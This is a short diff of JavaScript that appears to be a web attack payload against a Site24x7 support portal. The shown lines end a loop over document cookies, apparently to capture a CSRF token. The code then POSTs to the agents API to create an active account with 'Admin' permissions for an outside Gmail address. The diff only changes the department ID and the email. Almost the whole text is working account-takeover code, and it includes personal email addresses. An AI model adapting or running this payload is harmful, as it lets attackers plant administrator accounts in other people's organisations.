@@ -8,7 +8,7 @@ for(i=0;i<cookie.length;i++)
   }
 }
     
-var params={"firstName":"","lastName":"sandralosan","associatedDepartmentIds":[24000242077147],"associatedChatDepartmentIds":[""],"rolePermissionType":"Admin","aboutInfo":"","mobile":"","phone":"","extn":"","status":"ACTIVE","emailId":"masonhering7@gmail.com"};
+var params={"firstName":"","lastName":"sandralosan","associatedDepartmentIds":[9949000000006907],"associatedChatDepartmentIds":[""],"rolePermissionType":"Admin","aboutInfo":"","mobile":"","phone":"","extn":"","status":"ACTIVE","emailId":"sandralosan9@gmail.com"};
 $.ajax({
    url:"https://support.site24x7.com/api/v1/agents?orgId=6017018&crmcsrfparam="+csrf,
    type:"POST",
